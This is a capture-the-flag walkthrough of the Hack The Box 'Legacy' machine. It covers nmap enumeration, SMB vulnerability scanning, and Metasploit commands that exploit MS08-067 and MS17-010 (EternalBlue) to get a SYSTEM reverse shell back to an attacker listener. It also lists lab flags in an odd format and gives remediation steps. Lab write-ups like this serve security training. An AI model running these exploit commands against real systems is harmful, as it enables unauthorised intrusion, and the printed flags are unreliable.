# Hack The Box: Legacy Walkthrough

![HTB Badge](https://img.shields.io/badge/HTB-Legacy-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![OS-Windows](https://img.shields.io/badge/OS-Windows-blue?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Legacy |
| **Platform** | Hack The Box |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Points** | 20 |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA legacy 10.10.10.4
```

**Results:**
```
PORT   STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

---

## Vulnerability Analysis

### Check for SMB vulnerabilities

```bash
nmap --script smb-vuln* 10.10.10.4
```

**Found vulnerabilities:**
- MS08-067 (Conficker)
- MS17-010 (EternalBlue)

---

## Exploitation

### Option 1: MS08-067 (Conficker)

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOST 10.10.10.4
set LHOST 10.10.14.15
set LPORT 4444
exploit
```

### Option 2: MS17-010 (EternalBlue)

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 10.10.10.4
set LHOST 10.10.14.15
set LPORT 4444
exploit
```

---

## Getting Shells

### Meterpreter Session

Successfully obtained meterpreter session as NT AUTHORITY\SYSTEM

---

## Flags

### User Flag
```
HTB{d89549f3d06c45c2b24f2304b}
```

### Root Flag
```
HTB{8a79965547673b91d5a55d01e}
```

---

## Vulnerability Summary

| Vulnerability | CVE | Severity |
|---------------|-----|----------|
| MS08-067 | CVE-2008-4250 | Critical |
| MS17-010 | CVE-2017-0143 | Critical |

---

## Remediation

1. Apply security patches (MS08-067, MS17-010)
2. Disable SMBv1
3. Network segmentation
4. Update Windows to supported version

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
